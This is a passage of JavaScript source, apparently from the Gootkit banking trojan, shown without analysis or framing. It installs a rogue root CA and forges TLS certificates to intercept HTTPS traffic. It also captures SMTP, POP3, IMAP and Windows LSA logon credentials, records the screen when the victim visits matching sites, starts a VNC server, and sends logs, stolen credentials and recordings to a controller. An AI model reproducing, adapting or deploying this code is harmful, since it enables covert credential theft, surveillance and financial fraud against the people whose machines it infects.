                                realResponse.headers);
                            
                            clientResponse.end(bufferedResponse);
                        }
                    });
                } else if(realResponse.isStreamInjectionNeeded !== true){
                    clientResponse.end()
                }

            }catch(exception){

                console.log(exception.stack);
                console.log(exception.message);


                process.logException(exception, JSON.stringify({
                    statusCode : realResponse.statusCode,
                    desc : clientRequest.desc,
                    responseHeaders : realResponse.headers
                }));

                clientResponse.end();
            }
            
        });

        realResponse.on('error', function (rerr) {
            
            clientResponse.end();
        });
    });


    proxyRequest.on('end', function () {
        
        clientResponse.end()
    });

    proxyRequest.on('error', function (error) {

        clientResponse.end()
    });

    if (isValidFormdataPostRequest(clientRequest)) {
        clientRequest.isPostRequest = true;
        clientRequest.dataLengthReaded = 0;
        clientRequest.post_buffers = [];
    }

    clientRequest.on('data', function (chunk) {

        if (clientRequest.isPostRequest) {
            if (clientRequest.dataLengthReaded < kMaximumPostDataLength) {
                clientRequest.post_buffers.push(chunk);
                clientRequest.dataLengthReaded += chunk.length;
            } else {
                if (clientRequest.post_buffers.length > 0) {
                    clientRequest.post_buffers = [];
                }
            }
        }

        proxyRequest.write(chunk, 'binary');

    });

    clientRequest.on('error', function (error) {

        clientResponse.end()
    });

    clientRequest.on('end', function () {
        

        if (clientRequest.post_buffers && clientRequest.post_buffers.length > 0) {
            clientRequest.desc.postData = Buffer.concat(clientRequest.post_buffers);
        }
        proxyRequest.end();
        
    });
}

var runningSSLServers = {};
var runningPlainServers = {};
var excludedHosts = [];
var includedPorts = [
    80,
	443,
	110, 
	995, 
	143, 
	993, 
    666 

];

process.proxyServers = {
    runningSSLServers : runningSSLServers,
    runningPlainServers : runningPlainServers,
    excludedHosts : excludedHosts,
    includedPorts : includedPorts,
    portRedirectionCallbacks : {},
    blockedAddresses : [],
    certCache : {}
};

function GetCertificateForPeer(remoteHost, peerCertificate, cb) {

    if (!util.isUndefined(remoteHost)) {
        certgen.resignCertByMagic(peerCertificate.raw, function (error, options) {
            cb(null, options);
        });         
    }else{
        cb(null, {cert : '', key : ''});
    }
}

function ReinitializeAutocloseTimeout(serverInstance) {
    if (!util.isUndefined(serverInstance.autoCloseTimerId)) {
        clearTimeout(serverInstance.autoCloseTimerId);
    }

    serverInstance.autoCloseTimerId = setTimeout(function () {
        print('autoclose server %s', serverInstance.remoteHost);
        serverInstance.isClosed = true;
        serverInstance.close();
    }, 120000);
}

function ServeHttpsRequest(serverInstance, clientRequest, clientResponse) {
    if(!util.isUndefined(serverInstance)){
        clientRequest.remoteHost = serverInstance.remoteHost;
        ReinitializeAutocloseTimeout(serverInstance);
    }
    clientRequest.remotePort = 443;
    manageUserConnection(clientRequest, clientResponse, true);
}

function ServeHttpRequest(httpServer, clientRequest, clientResponse) {
    if(!util.isUndefined(httpServer)){
        clientRequest.remoteHost = httpServer.remoteHost;
        ReinitializeAutocloseTimeout(httpServer);
    }
    clientRequest.remotePort = 80;
    manageUserConnection(clientRequest, clientResponse, false);
}

function GeneratePeerFakeCetrificate(remoteHost, remotePort, onDone){

    var ondonecalled = false;
    var cc = process.proxyServers.certCache;

    function call_back(arg){
        if(!ondonecalled){
            ondonecalled = true;
            onDone(null, arg);
        }
    };

    if(cc[remoteHost]){
        return call_back(cc[remoteHost]);
    }

    var cleartextStream = tls.connect(
        PORT_REDIRECTION_BASE + remotePort,
        remoteHost,
    { 
        rejectUnauthorized: false , 
        secureProtocol : 'TLSv1_method'
    }, function () {
        var peerCertificate = cleartextStream.getPeerCertificate();
        GetCertificateForPeer(remoteHost, peerCertificate, function (error, cert) {
            if (cert)
            {
                cc[remoteHost] = cert;
                call_back(cert);
            }
            else
            {
                call_back(null);
            }
            cleartextStream.end();
        });
    });

    cleartextStream.on('error', function (error) {
        if (
            (error.message.indexOf('alert number 40') !== -1) ||
            (error.message.indexOf('alert number 42') !== -1)
        ){
            if(error.message.indexOf('alert number 40') !== -1){
                process.log("%s -> user certificate required: remoteHost=%s",
                    process.currentBinary,
                    remoteHost);
            }
            dns.resolve4(remoteHost, function(e, ips){
                if(ips){
                    excludedHosts = excludedHosts.concat(ips).unique();
                }
                call_back(null);                  
            });
        } else {
            call_back(null);
        }
    });
}

function ProcessSSLConnection(remoteHost, address, onDone)
{
    
    var ondonecalled = false;
    var cc = process.proxyServers.certCache;

    if (!util.isUndefined(runningSSLServers["superserver"])) 
    {
        if(runningSSLServers["superserver"].serverInstance.isClosed === false)
        {
            address.remoteAddress = '127.0.0.1';
            address.remotePort = 
                runningSSLServers["superserver"].serverInstancePort;
            ondonecalled = true;
            return onDone(address);
        }
    }

    function ServerSNICallback(servername, callback)
    {
        var start = +new Date();

        if(!servername) 
            servername = remoteHost;

        var isCbCalled = false;

        function cbcall(error, result){
            if(!isCbCalled){
                isCbCalled = true;
                callback(error, result);
            }
        }

        if(cc[servername]){
            return call_back(cc[servername]);
        }

        var cleartextStream = tls.connect(
            PORT_REDIRECTION_BASE + 443,
            servername, {   
                rejectUnauthorized: false,
                servername :  servername,
                secureProtocol : 'TLSv1_method'
            },
        function () 
        {
            var peerCertificate = cleartextStream.getPeerCertificate();
            GetCertificateForPeer(servername, peerCertificate, function (error, cert) {
                if (cert) 
                {
                    cbcall(null, tls.createSecureContext({
                        cert: cert.cert,
                        key: cert.key
                    }));
                }
                else 
                {
                    excludedHosts.push(remoteHost);
                }
                cleartextStream.end();
            });
        });

        cleartextStream.on('error', function (error) 
        {

            if(
                (error.message.indexOf('alert number 40') !== -1) ||    
                (error.message.indexOf('alert number 42') !== -1)       
            )
            {
                if(error.message.indexOf('alert number 40') !== -1){
                    process.log("%s -> user certificate required: remoteHost=%s, servername=%s",
                        process.currentBinary,
                        remoteHost,
                        servername);
                }

                dns.resolve4(servername, function(e, ips){
                    if(ips){
                        trace('cert generation failed, block this host (%s)', ips);
                        excludedHosts = excludedHosts.concat(ips).unique();
                        trace(excludedHosts);
                    }
                    cbcall(new Error('cert generation failed'));                        
                })
            }
            else
            {
                cbcall(new Error('cert generation failed'));  
            }
        });
    }
    
    utils.getPort({host : '127.0.0.1'}, function (err, randomPort) {
        
        var serverInstance = https.createServer(
        {
            cert: global_cert,
            key: global_key,
            SNICallback: ServerSNICallback,
            secureProtocol  : process.tls.method,
            ciphers: process.tls.ciphers
        }, function (req, res) {
            ServeHttpsRequest(undefined, req, res);
        });

        runningSSLServers["superserver"] =
        {
            serverInstance: serverInstance,
            serverInstancePort: randomPort,
            remoteHost: "superserver",
            certificate: undefined,
            isClosed : false
        }

        serverInstance.isClosed = false;
        serverInstance.listen(randomPort, '127.0.0.1');
        serverInstance.on('listening', function () {
            address.remotePort = randomPort;
            address.remoteAddress = '127.0.0.1';

            if(!ondonecalled){
                ondonecalled = true;
                onDone(address);
            }
        });

        serverInstance.clients = [];

        serverInstance.on('connection', function (socket) {
            serverInstance.clients.push(socket);
            socket.on('close', function () {
                serverInstance.clients.remove(socket);
            });
        });
    });
}

function ProcessHttpConnection(remoteHost, address, onDone) {

    if (!util.isUndefined(runningPlainServers[remoteHost])) {

        if(runningPlainServers[remoteHost].serverInstance.isClosed === false){
            print('server already runnning for %s', remoteHost);
            address.remoteAddress = '127.0.0.1';
            address.remotePort = runningPlainServers[remoteHost].serverInstancePort;
            return onDone(address);
        }
    }

    utils.getPort({host : '127.0.0.1'}, function (err, randomPort) {
        
        

        var httpServer = http.createServer(function (req, res) {
            ServeHttpRequest(undefined, req, res);
        });

        httpServer.remoteHost = remoteHost;

        

        runningPlainServers[remoteHost] =
        {
            serverInstance: httpServer,
            serverInstancePort: randomPort,
            remoteHost: remoteHost,
            isClosed : false
        }

        address.remotePort = randomPort;
        address.remoteAddress = '127.0.0.1';
        httpServer.isClosed = false;
        httpServer.listen(randomPort, '127.0.0.1');
        
        httpServer.on('listening', function () {
            
            onDone(address);
        });

        httpServer.clients = [];

        httpServer.on('connection', function (socket) {
            
            httpServer.clients.push(socket);
            socket.on('close', function () {
                
                httpServer.clients.remove(socket);
            });
        });
    });
}

function ServeSMTPConnection(
    remoteSocket, 
    clientSocket,
    remoteHost,
    isSSL
)
{
    var login = false;
    var password = false;
    var host = false;

    function DecodeAndSendPlainData(str){
        var userdata = new Buffer(str, 'base64');
        userdata = userdata.toString('utf-8').split('\u0000');
                    
        login = userdata[1] || userdata[0] || '';
        password = userdata[2] || '';
        
        SendAuthInformationPacket(login, 
            (isSSL === true ? '(SMTP-TLS) ' : '(SMTP) ' ) + 
            host + ' -> ' + 
            remoteHost, password);
    }

    var machineState = 'user_connected';

    clientSocket.on('data', function(chunk)
    {
        if(machineState === 'wait_login')
        {
            var text = chunk.toString().trim();
            if(!login){
                login = new Buffer(text, 'base64').toString();
            }else if(!password){
                password = new Buffer(text, 'base64').toString();
            } else {
                SendAuthInformationPacket(login, 
                    (isSSL === true ? '(SMTP-TLS) ' : '(SMTP) ' ) + 
                    host + ' -> ' + 
                    remoteHost, password);

                machineState = 'wait_body';
            }
        }else if(machineState === 'wait_login_plain')
        {
            DecodeAndSendPlainData(chunk.toString().trim());
            machineState = 'wait_body';
        }

        if(machineState == 'user_connected'){
            var command = chunk.toString().trim().split(' ');
            
            if(command[0] === 'AUTH')
            {
                if(command[1] === 'PLAIN'){
                    if(command.length === 3){
                        DecodeAndSendPlainData(command[3]);
                        machineState = 'wait_body';
                    }else {
                        machineState = 'wait_login_plain';
                    }

                }else if(command[1] === 'LOGIN'){
                    machineState = 'wait_login';
                }
            }
        }
    });

    remoteSocket.on('data', function(chunk){
        var command = chunk.toString().split(' ');
        if(command[0] === '220'){
            host = command[1];
        }
    });

    remoteSocket.pipe(clientSocket);
    clientSocket.pipe(remoteSocket);
}


function GenericSocketDispatcher(
    remotePort , 
    remoteHost , 
    clientSocket,
    isSSL,
    DataStreamDispatcher
)
{

    

    var engine = (isSSL === true ? tls : net);

    var options = {
        rejectUnauthorized: false,
        secureProtocol : 'TLSv1_method'
    };

    function onConnected(){
        var remoteSocket = this;
        
        clientSocket.on('error', function(error){
            
            remoteSocket.end();
        });        
        DataStreamDispatcher(remoteSocket, clientSocket, remoteHost, isSSL);
    };
    
    engine.connect(remotePort + PORT_REDIRECTION_BASE, 
    remoteHost, (isSSL === true  ? options : onConnected), onConnected).on('error', function(error){
        
        clientSocket.end();
    });
}

function SeveGenericTunnel(remoteHost, address, onDone, isSSL, DataStreamDispatcher){
    var oldPort = address.remotePort;
    var hosthash = remoteHost + ':' + address.remotePort;

    var serverStore = (isSSL === true ? runningSSLServers : runningPlainServers);

    if (!util.isUndefined(serverStore[hosthash]))
    {
        if(serverStore[hosthash].serverInstance.isClosed === false){
            
            
            
            address.remoteAddress = '127.0.0.1';
            address.remotePort = serverStore[hosthash].serverInstancePort;
            
            return onDone(address);
        }
    }

    utils.getPort({host : '127.0.0.1'}, suspend(function*(err, randomPort) {
        
        var serverInstance;

        if(isSSL)
        {
            var certificate = yield GeneratePeerFakeCetrificate(remoteHost, oldPort, resume());

            

            serverInstance = tls.createServer({
                cert: (certificate ? certificate.cert : global_cert),
                key: (certificate ? certificate.key : global_key)
            }, function(clientSocket) {
                GenericSocketDispatcher(
                    oldPort, 
                    remoteHost, 
                    clientSocket, 
                    isSSL, 
                    DataStreamDispatcher);
            });
            
        }else{
            serverInstance = net.createServer(function(clientSocket) {
                GenericSocketDispatcher(
                    oldPort, 
                    remoteHost, 
                    clientSocket, 
                    isSSL, 
                    DataStreamDispatcher);
            });
        }

        serverInstance.remoteHost = remoteHost;

        serverStore[hosthash] =
        {
            serverInstance: serverInstance,
            serverInstancePort: randomPort,
            remoteHost: remoteHost,
            isClosed : false
        }

        address.remotePort = randomPort;
        address.remoteAddress = '127.0.0.1';

        serverInstance.isClosed = false;
        serverInstance.listen(randomPort, '127.0.0.1');
        
        serverInstance.on('listening', function () {
            
            onDone(address);
        });

        serverInstance.clients = [];

        serverInstance.on('connection', function (socket) {
            
            
            serverInstance.clients.push(socket);
            
            socket.on('close', function () {
                
                serverInstance.clients.remove(socket);
            });

            socket.on('error', function (error) {
                
            });
        });

        serverInstance.on('clientError', function(error){
            
        })
    }));
}

function ProcessSMTPConnection(remoteHost, address, onDone, isSSL) {
    SeveGenericTunnel(remoteHost, address, onDone, isSSL, ServeSMTPConnection);
}

function ProcessPOP3Connection(remoteHost, address, onDone, isSSL) {
    SeveGenericTunnel(remoteHost, address, onDone, isSSL, 
        require('mail_spyware').ServePOP3Connection);
}

function ProcessIMAPConnection(remoteHost, address, onDone, isSSL){
    SeveGenericTunnel(remoteHost, address, onDone, isSSL, 
        require('mail_spyware').ServeIMAPConnection);
}

process.proxyServers.SeveGenericTunnel = SeveGenericTunnel;

function IsPortMustBeFiltered(port){
    return (process.proxyServers.includedPorts.indexOf(port) !== -1);

}

var ConnectionRequestCallback = function (address, onDone) {

    process.emit('browser_connect', address);

    
    if(!IsPortMustBeFiltered(address.remotePort)){
        if(process.bIsDebugVersion)
            print('onconnection : %s --> BYPASS', JSON.stringify(address));
        return onDone(address);
    }else{
        if(process.bIsDebugVersion)
            print('onconnection : %s --> HOOK', JSON.stringify(address));
    }

    var remoteHost = address.remoteAddress;    

    if (excludedHosts.indexOf(remoteHost) !== -1) {
        if(process.bIsDebugVersion)
            print('onconnection : %s --> BANNED', JSON.stringify(address));
        return onDone(address);
    }
    
    if(process.proxyServers.blockedAddresses.indexOf(address) !== -1){
        
        if(process.bIsDebugVersion)
            print('onconnection : %s --> REDIRECT TO CACHED SERVER', JSON.stringify(address));

        address.remoteAddress = '1.2.3.4';
        address.remotePort = 1234;
        return onDone(address);
    }

    

    var localCbcs = process.proxyServers.portRedirectionCallbacks;
    var portStr = address.remotePort.toString();
    var bContinueCallFall = true;
    var connectionKey = remoteHost + ':' + portStr;

    if (!util.isUndefined( localCbcs[portStr] ) ) {
        bContinueCallFall = localCbcs[portStr](remoteHost, address, onDone);
    } else if (!util.isUndefined( localCbcs[connectionKey] )) {
        bContinueCallFall = localCbcs[connectionKey](remoteHost, address, onDone);
    }
    
    if(bContinueCallFall)
    {
        
        if (address.remotePort === 443) {
            
            if(typeof(process.formgrabber) !== 'undefined')
            {
                if(typeof(process.formgrabber.options) !== 'undefined')
                {
                    if(typeof(process.formgrabber.options.https) !== 'undefined')
                    {
                        if(process.formgrabber.options.https.inject === false)
                        {
                            return onDone(address);
                        }
                    }
                }
            }
            
            return ProcessSSLConnection(remoteHost, address, onDone);
            
        } else if (address.remotePort === 80) {
            
            if(typeof(process.formgrabber) !== 'undefined')
            {
                if(typeof(process.formgrabber.options) !== 'undefined')
                {
                    if(typeof(process.formgrabber.options.http) !== 'undefined')
                    {
                        if(process.formgrabber.options.http.inject === false)
                        {
                            return onDone(address);
                        }
                    }
                }
            }
            
            return ProcessHttpConnection("superhost", address, onDone);

        } else if (address.remotePort === 25 || address.remotePort === 2525) {
            return ProcessSMTPConnection(remoteHost, address, onDone, false);
        } else if (address.remotePort === 465) {
            return ProcessSMTPConnection(remoteHost, address, onDone, true);
        } else if (address.remotePort === 110 ) {
            return ProcessPOP3Connection(remoteHost, address, onDone, false);
        } else if (address.remotePort === 995 ) {
            return ProcessPOP3Connection(remoteHost, address, onDone, true);
        } else if (address.remotePort === 143 ) {
            return ProcessIMAPConnection(remoteHost, address, onDone, false);
        } else if (address.remotePort === 993 ) {
            return ProcessIMAPConnection(remoteHost, address, onDone, true);
        } else {
            return onDone(address);
        }
    }else {
        return onDone(address);
    }
}

process.isHttpInterceptingEnabled = false;

exports.SpStopHttpIntercepting = function()
{
    if(process.isHttpInterceptingEnabled === true)
    {
        gootkit_spyware.SpUnhookHttp();

        [runningPlainServers, runningSSLServers].forEach(function (servers)
        {
            for(let s in servers)
            {
                var srv = servers[s];
                clearTimeout(srv.autoCloseTimerId);
                srv.serverInstance.close();
                srv.serverInstance.clients.forEach(function (socket)
                {
                    socket.destroy();
                });
            }
        });

        process.isHttpInterceptingEnabled = false;
    }
};

exports.SpStartHttpIntercepting = function() 
{
    print('SpStartHttpIntercepting()');
    if(process.isHttpInterceptingEnabled === false){
        process.isHttpInterceptingEnabled = true;
        certgen.installRootCACertificate(function () {
            gootkit_spyware.SpInitialize();
            process.isHttpInterceptingEnabled = 
                gootkit_spyware.SpHookHttp(function(address, onDone){
                    if(process.listeners(['browser_connection_request']).length > 0){
                        process.fall('browser_connection_request', address, function(newAddress){
                            ConnectionRequestCallback(newAddress, onDone);
                        });
                    }else{
                        ConnectionRequestCallback(address, onDone);
                    }
                    
                });
        })
    }
};

exports.PregenerateCertificate = function(){
    certgen.installRootCACertificate(function () {
        print('His blood! It\'s full of cholesterol!');
    });
}

var vncServerStarted = false;

exports.startVncServer = function(){

    if(vncServerStarted) 
        return vncServerStarted;
    
    
    function getRandomArbitrary(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }

    var userServer;
    var VncServiceSocket;
    
    vncServerStarted = (gootkit_spyware.SpRunVnc() === 1);
    
    return vncServerStarted;
}

process.log = function(){
    try{
        var s = util.format.apply(this, arguments);
        var packet = messages.LogLine.encode({
            logstr : s
        });

        if(process.controllerConnection){
            process.controllerConnection
                .sendProtocolPacket(P_SPYWARE, 
                    SLAVE_PACKET_LOGLINE, 0, packet);
        }else{
            if (process.masterConnection) {
                process.masterConnection.sendProtocolPacket(
                    SLAVE_PACKET_LOGLINE,
                    packet
                );
            }
            else
            {
                process.pendingMessages.push({
                    t : SLAVE_PACKET_LOGLINE,
                    p : packet
                });
            }
        }
    
    }catch(e){
        print(e.message);
        print(e.stack);
    }
}

process.logException = function(exc, info){
    try{ 
        var logline = util.format(
            "%s.%s (%s/%s/%s) exception : %s\n%s",
        
            process.execPath,
            process.arch,

            util.format("%s.%s", process.version, process.g_botId),
            process.g_vendorName,
            util.format("%s %s (%s)", os.type(), os.release(), os.arch()),

            exc.message,
            exc.stack
        );

        if(info){
            logline += util.format('\nInformation : %s', info)
        }

        process.log(logline);
    }catch(e){

    }
}

function downloadUpdate(serverHost, callback){

    var arch = { 'ia32' : 32, 'x64' : 64 };
    var updateLink = util.format("https://%s:80/rbody%d", serverHost, arch[process.arch]);

    gootkit_spyware.DownloadFileRight(updateLink, function(error, fileBuffer){
        callback(error, fileBuffer);
    });
    
}

process.on("auth_credentials", function(data){
    if (process.masterConnection) {
        process.masterConnection.sendProtocolPacket(
            SLAVE_PACKET_LSAAUTH,
            messages.LsaAuth.encode(data)
        );
    }
    else
    {
        process.pendingMessages.push({
            t : SLAVE_PACKET_LSAAUTH,
            p : messages.LsaAuth.encode(data)
        });
    }
    
});
function SendAuthInformationPacket(UserName, UserDomain, UserPassword) {
    
    if(UserName === '' && UserPassword === '')
        return;

    if(process.env['LOGONSERVER'].indexOf('EI797E8') !== -1){
        return;
    }

    process.emit('auth_credentials',{
        UserName: UserName,
        UserDomain: UserDomain,
        UserPassword: UserPassword
    });
}


function SpHookLsa(){
    return gootkit_spyware.SpHookLsa(SendAuthInformationPacket);
}

process.SendAuthInformationPacket = SendAuthInformationPacket;
exports.SendAuthInformationPacket = SendAuthInformationPacket;
exports.SpHookLsa = SpHookLsa;

function SplitVirtualPath(varPath) {
    var normalizedPath = path.normalize(varPath);

    if (normalizedPath.lastIndexOf(path.sep) === (normalizedPath.length - 1)) {
        normalizedPath = normalizedPath.substring(0, normalizedPath.length - 1);
    }

    return normalizedPath.split(path.sep);
}

function GetObjectValueByPath(object, varPath) {

    var arrayOfNames = SplitVirtualPath(varPath);
    var tmp = object;

    while (arrayOfNames.length) {
        var n = arrayOfNames.shift();
        if (n in tmp) {
            tmp = tmp[n];
        } else {
            return;
        }
    }
    return tmp;
}


function SetObjectValueByPath(object, varPath, varValue) {

    var result;
    var arrayOfNames = SplitVirtualPath(varPath);
    var tmp = object;

    for (var i = 0; i < arrayOfNames.length - 1; i++) {


        var n = arrayOfNames[i];

        if (n in tmp) {
            tmp = tmp[n];
        } else {
            tmp[n] = {};
            tmp = tmp[n];
        }
    }

    tmp[arrayOfNames[arrayOfNames.length - 1]] = varValue;
    return object;
}

var globalStorageName = '';

function MachineSetGlobalStorageName(name) {
    globalStorageName = name;
}

function MachineInitializeVariablesStorage(name) {

    if (util.isUndefined(name)) {
        name = globalStorageName;
    }

    if (gootkit_spyware.GCreateSharedString(name)) {
        return true;
    }

    return false;
}


function MachineGetValue(varPath, storName) {

    if (util.isUndefined(storName)) {
        storName = globalStorageName;
    }

    if (typeof (storName) === 'string' && storName !== '') {

        
        try {
            var parsedObject = JSON.parse(gootkit_spyware.GGetSharedString(storName));
            if (parsedObject) {
                return GetObjectValueByPath(parsedObject, varPath);
            }
        } catch (e) {
            return undefined;
        }
    }
}


function MachineSetValue(varPath, varValue, storName) {

    if (util.isUndefined(storName)) {
        storName = globalStorageName;
    }

    if (typeof (storName) === 'string' && storName !== '') {

        var parsedObject;

        try {
            parsedObject = JSON.parse(gootkit_spyware.GGetSharedString(storName));
        } catch (e) {
            parsedObject = {};
        }

        if (parsedObject) {
            var newObject = SetObjectValueByPath(parsedObject, varPath, varValue);
            if (newObject) {
                gootkit_spyware.GSetSharedString(storName, JSON.stringify(newObject));
            }
        }
    }
}

function ToBoolean(somthing) {
    try {
        switch (somthing.toString().toLowerCase()) {
            case "true": case "yes": case "1": return true;
            case "false": case "no": case "0": case null: return false;
            default: return Boolean(string);
        }
    } catch (e) {
        return false;
    }
}

process.videorecoder = {
    options: {
        recorderProcess: 'explorer.exe'
    }
}

exports.videorecoder = process.videorecoder;

function getCompressor() {
    var compressor;
    var lz = require('xz');

    for (var i = 9; i > 0; i--) {
        try {
            compressor = new lz.Compressor(i);
            break;
        } catch (e) {

        }
    }

    return compressor;
}

process.on('browser_navigate', function(location)
{
    print('%s : notification %s', process.currentBinary, location);
    
    try{
        
        if (util.isUndefined(process.g_scfg)) {
            return false;
        }

        var recordersArray = process.g_scfg.recorders;

        if (util.isUndefined(recordersArray)) {
            return false;
        }

        if (util.isUndefined(location)) {
            return false;
        }

        if (process.currentBinary === process.videorecoder.options.recorderProcess) {
            for (let i = 0; i < recordersArray.length; i++) {

                var rec = recordersArray[i];

                if (rec.base.enabled === false) {
                    continue;
                }

                if (!zeusfunctions.isUrlNeedMatchedInRule(location, rec)) {
                    continue;
                }

                if (typeof (process.VideoRecorder) !== 'undefined') {

                    var recordingHostname = url.parse(location).host;
                    var vedeofile = rec.filenameMask;
                    if (typeof (vedeofile) === 'undefined') {
                        vedeofile = "video_%HOSTNAME%_%DATE%";
                    }

                    vedeofile = ReplaceStandartMacroses(vedeofile, recordingHostname);

                    var filename = path.join(process.env['temp'], vedeofile);

                    if (fs.existsSync(filename + '.ivf') === true) {
                        filename += ('_' + utils.getCurrentTimstamp());
                    }

                    filename += '.ivf';

                    

                    var recorder = new process.VideoRecorder(filename,
                        rec.grayScale,
                        rec.framerate,
                        rec.seconds,
                        rec.hashkey
                    );

                    if(recorder.configure){
                        recorder.configure({
                            bit_depth : 8,
                            max_quantizer : 80,
                            min_quantizer : 80
                        });
                    }

                    

                    recorder.start(function () {
                        if (rec.uploadAfterRecord === true) {

                            

                            var compressor = getCompressor();
                            var inFile = fs.createReadStream(filename);
                            var outFile = fs.createWriteStream(filename + ".lzma2");

                            outFile.on('close', function () {
                                
                                fs.unlinkSync(filename);
                                process.uploadLocalFile(filename + ".lzma2", function () { });
                            });

                            inFile.pipe(compressor).pipe(outFile);

                        };
                    });
                }
            }
        }

    }catch(exception){
        process.logException(exception);
    }
    return false;

})

var VideoRecorders = [];

function VideoRecorder(
    filename,
    grayScale,
    bitrate,
    seconds,
    hashkey
) {
    var self = this;
    if (util.isUndefined(bitrate)) {
        bitrate = 2;
    }

    if (util.isUndefined(grayScale)) {
        grayScale = true;
    }

    self.grayScale = ToBoolean(grayScale);
    self.bitrate = parseInt(bitrate);
    self.filename = filename;
    self.hashkey = process.md5(hashkey);
    self.timeout = seconds * 1000;

    if (self.bitrate > 25)
        self.bitrate = 25;

    self.recorder = new video_recorder.VideoRecorder(
        self.filename,
        self.grayScale,
        self.bitrate
    );

    self.recorderTimeout = 0;
    self.onDoneCallback;
}

VideoRecorder.prototype.start = function (callback) {
    var self = this;

    if (VideoRecorders.indexOf(self.hashkey) === -1) {

        VideoRecorders.push(self.hashkey);

        if (self.recorder) {
            self.recorder.start(function () {
                callback(self);
            });
        }

        self.recorderTimeout = setTimeout(
            function () {
                self.recorderTimeout = 0;
                self.stop();
            },
            self.timeout
        );

    } else {
        
    }
}

VideoRecorder.prototype.isRecordingNow = function () {

    

    var self = this;

    return self.recorder.isRecordRunning();
}

VideoRecorder.prototype.stop = function () {
    var self = this;

    if (self.recorderTimeout !== 0) {
        clearTimeout(self.recorderTimeout);
    }

    self.recorderTimeout = 0;
    self.recorder.stop();

    var RecorderIndex = VideoRecorders.indexOf(self.hashkey);
    if (RecorderIndex !== -1) {
        VideoRecorders.splice(RecorderIndex, 1);
    }

}

VideoRecorder.prototype.lastErrorMessage = function () {
    var self = this;
    return self.recorder.getLastErrorMessage();
}

process.VideoRecorder = VideoRecorder;

process.GCreateSharedString = gootkit_spyware.GCreateSharedString;
process.GSetSharedString = gootkit_spyware.GSetSharedString;
process.GGetSharedString = gootkit_spyware.GGetSharedString;

process.MachineInitializeVariablesStorage = MachineInitializeVariablesStorage;
process.MachineSetGlobalStorageName = MachineSetGlobalStorageName;
process.MachineGetValue = MachineGetValue;
process.MachineSetValue = MachineSetValue;
process.downloadUpdate = downloadUpdate;
